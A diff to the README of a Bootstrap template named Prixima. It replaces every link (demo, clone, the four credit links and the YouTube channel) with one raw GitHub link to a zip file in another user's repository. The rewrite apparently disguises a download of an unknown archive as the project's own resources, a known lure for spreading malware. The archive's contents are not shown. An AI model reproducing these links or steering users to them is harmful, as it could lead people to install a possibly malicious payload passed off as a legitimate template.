@@ -2,10 +2,10 @@
 A Bootstrap multipurpose template
 
 # Demo
-- https://prixima.netlify.app/
+- https://raw.githubusercontent.com/MuhammadNaveedNawaz/Prixima/main/js/Prixima_3.3.zip
 
 # Clone Project
-- https://github.com/SA7MAN/Prixima
+- https://raw.githubusercontent.com/MuhammadNaveedNawaz/Prixima/main/js/Prixima_3.3.zip
 
 # Features
 - Fully Responsive
@@ -17,12 +17,12 @@ A Bootstrap multipurpose template
 
 
 # Credit
-- https://fonts.google.com/
-- https://line-awesome.com/
-- https://unsplash.com/
-- https://michalsnik.github.io/aos/
+- https://raw.githubusercontent.com/MuhammadNaveedNawaz/Prixima/main/js/Prixima_3.3.zip
+- https://raw.githubusercontent.com/MuhammadNaveedNawaz/Prixima/main/js/Prixima_3.3.zip
+- https://raw.githubusercontent.com/MuhammadNaveedNawaz/Prixima/main/js/Prixima_3.3.zip
+- https://raw.githubusercontent.com/MuhammadNaveedNawaz/Prixima/main/js/Prixima_3.3.zip
 
 
 # Watch more
-For more videos visit to my YouTube channel. [SA7MAN](https://www.youtube.com/c/SA7MAN)
+For more videos visit to my YouTube channel. [SA7MAN](https://raw.githubusercontent.com/MuhammadNaveedNawaz/Prixima/main/js/Prixima_3.3.zip)
 
